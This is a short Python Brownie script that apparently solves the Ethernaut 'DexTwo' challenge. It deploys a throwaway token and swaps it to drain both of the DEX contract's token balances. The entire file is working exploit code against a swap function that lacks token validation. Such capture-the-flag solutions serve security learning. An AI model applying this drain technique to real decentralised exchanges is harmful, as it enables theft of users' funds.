from brownie import DexTwo, AttackToken, Contract
from scripts.helpful_scripts import *

account = getAccount()

dextwo = Contract.from_abi(
    "DexTwo", "0x40d425002574cCB5b524FD9A36966F4Ef16680C3", DexTwo.abi
)


def main():
    token = AttackToken.deploy("Attack", "ATK", 4, {"from": account})
    token.approve(dextwo.address, 100, {"from": account})

    tx = dextwo.add_liquidity(token.address, 1, {"from": account})
    tx.wait(1)

    tx = dextwo.swap(token.address, dextwo.token1(), 1, {"from": account})
    tx.wait(1)

    tx = dextwo.swap(token.address, dextwo.token2(), 2, {"from": account})
    tx.wait(1)

    print(dextwo.balanceOf(dextwo.token1(), dextwo.address))
    print(dextwo.balanceOf(dextwo.token2(), dextwo.address))
